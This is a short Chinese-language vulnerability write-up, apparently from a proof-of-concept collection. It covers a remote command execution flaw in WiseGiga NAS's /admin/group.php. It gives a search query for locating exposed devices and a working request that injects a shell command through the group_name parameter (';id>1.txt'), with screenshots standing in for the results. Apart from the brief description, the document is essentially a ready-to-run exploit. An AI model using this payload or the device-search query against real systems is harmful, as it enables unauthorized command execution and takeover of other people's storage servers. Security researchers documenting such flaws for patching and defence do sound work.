# WiseGiga NAS group.php 远程命令执行漏洞

## 漏洞描述

WiseGiga NAS group.php文件存在远程命令执行漏洞，攻击者通过发送特定的请求包可以获取服务器权限

## 漏洞影响

<a-checkbox checked>WiseGiga NAS</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="WISEGIGA-NAS"</a-checkbox></br>

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1656240215340-595e0191-aa82-407e-972d-a59339dfd28a-20220626192524954.png)

验证POC

```php
/admin/group.php?memberid=root&cmd=add&group_name=d;id>1.txt
```

![img](../../../.vuepress/public/img/1656242636704-5f2865a9-4521-4d83-9e09-e39794f8204b-20220626192504901.png)

![img](../../../.vuepress/public/img/1656242655760-33a64203-f341-4af7-a9b8-5aeb1ff66859-20220626192501808.png)